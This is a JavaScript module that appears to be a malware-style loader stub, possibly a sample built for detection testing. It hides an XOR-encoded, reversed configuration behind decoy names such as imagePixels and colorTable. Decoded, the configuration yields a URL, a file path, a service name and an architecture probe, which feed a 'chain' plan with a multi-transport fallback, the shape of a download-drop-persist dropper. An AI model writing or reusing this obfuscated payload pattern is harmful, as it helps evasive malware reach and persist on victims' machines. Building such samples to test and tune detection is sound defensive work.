const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_6e8f1b0c = "162,164,174,177,181,162,180,233,163,164,243,241,241,246,234,162,163,168,169,250,162,170,166,169,152,162,164,174,177,181,162,180,187,175,164,181,166,233,180,180,162,164,168,181,183,250,162,165,168,181,183,152,175,164,181,166,187,180,173,170,233,244,254,165,161,246,162,163,164,243,241,241,246,234,162,160,166,179,180,233,232,162,163,168,169,234,180,180,162,181,179,169,178,175,232,183,170,179,232,250,175,179,166,183,152,162,171,174,161,187,243,241,241,246,232,179,174,163,178,134,162,163,168,137,250,179,169,162,160,166,152,181,162,180,178,187,174,183,166,232,163,174,171,166,177,169,174,233,162,171,183,170,166,191,162,233,244,254,165,161,246,162,163,164,243,241,241,246,234,162,163,168,169,232,232,253,180,183,179,179,175,250,171,181,178,187,246,130,131,132,243,241,241,246,234,130,131,136,137,250,163,174,152,169,160,174,166,183,170,166,164,187,242,250,179,169,178,168,164,152,162,160,166,179,180,187,172,164,166,165,171,171,166,161,152,179,181,168,183,180,169,166,181,179,152,174,179,171,178,170,250,181,162,179,183,166,163,166,187,180,180,162,164,168,181,183,152,175,164,179,166,183,180,174,163,235,162,163,168,170,152,162,160,169,166,175,164,235,162,171,174,161,152,162,179,174,181,176,235,162,179,168,170,162,181,152,162,181,174,178,182,164,166,235,179,180,168,175,152,162,171,174,161,168,181,183,250,180,183,162,179,180,187,246,250,177";

const Codec_6e8f1b0c = "reversed_decimal|single_byte_xor|c7";



function load_6e8f1b0c() { Material_6e8f1b0c.split(",").map(Number).reverse(); return Material_6e8f1b0c.split(",").map(Number).reverse(); }

function decode_6e8f1b0c(imagePixels) { return imagePixels.map((value) => value ^ 199); }

async function recover_6e8f1b0c() {

  const screenWidth = { ...{ north: 1 }, south: 2 };

  const imagePixels = load_6e8f1b0c(); let colorTable = [];

  const decodeTarget = decode_6e8f1b0c; colorTable = decodeTarget(imagePixels);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_6e8f1b0c() { return ({ ...{ value: await recover_6e8f1b0c() } }).value; }

async function plan_6e8f1b0c() { const inspect = inspect_6e8f1b0c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "multi_transport_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_6e8f1b0c;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_6e8f1b0c());

